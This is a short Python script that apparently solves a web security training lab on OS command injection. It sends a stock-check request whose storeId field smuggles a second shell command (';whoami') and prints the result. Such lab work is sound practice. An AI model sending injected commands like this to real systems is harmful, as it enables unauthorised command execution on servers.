# Lab: OS command injection, simple case
# difficulty: apprentice

import requests

sub = '0a6500dc03f6e4cb810acf9e00a80070'
url = f'https://{sub}.web-security-academy.net'

def main():
    payload = ';whoami'
    body = {
        'productId': 1,
        'storeId': f'1{payload}'
    }
    
    endpoint = '/product/stock'
    r = requests.post(url + endpoint, data=body)
    print(r.text)

if __name__ == '__main__':
    main()